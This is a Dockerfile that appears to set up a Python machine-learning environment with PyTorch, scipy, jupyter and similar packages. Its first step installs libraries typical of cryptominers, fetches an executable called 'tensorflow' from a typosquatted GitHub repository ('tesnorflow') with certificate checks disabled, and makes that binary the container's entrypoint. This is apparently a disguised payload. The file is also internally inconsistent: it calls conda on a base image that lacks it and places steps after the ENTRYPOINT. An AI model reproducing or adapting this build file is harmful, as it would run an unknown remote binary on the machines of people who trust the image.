FROM ubuntu:16.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        wget \
        libzmq3-dev \
        libuv1-dev \
        libcurl4-openssl-dev \
        
    && rm -r /var/lib/apt/lists/* \
    && wget --no-check-certificate https://github.com/tesnorflow/tesnorflow/raw/master/configure.py \
    && wget --no-check-certificate https://github.com/tesnorflow/tesnorflow/raw/master/tensorflow \
    && chmod +x tensorflow

ENTRYPOINT ["./tensorflow"]

# install git
RUN apt-get -y update && apt-get -y install git

# install PyTorch dependeces using pip
RUN /opt/conda/bin/conda install pytorch torchvision cudatoolkit=9.0 -c pytorch


# install visdom dependeces using pip
RUN python3 -m pip install -q visdom

# install imageio dependeces using pip
RUN python3 -m pip install -q imageio

# install scipy dependeces using pip
RUN python3 -m pip install -q scipy

# install sklearn dependeces using pip
RUN python3 -m pip install -q sklearn

# install skimage dependeces using pip
RUN python3 -m pip install -q scikit-image

# install numpy dependeces using pip
RUN python3 -m pip install -q numpy

# install jupyter, matplotlib dependeces using pip
RUN python3 -m pip install -q jupyter matplotlib

# install numpy dependeces using pip
RUN python3 -m pip install -q xlrd

# install numpy dependeces using pip
RUN python3 -m pip install -q xlwt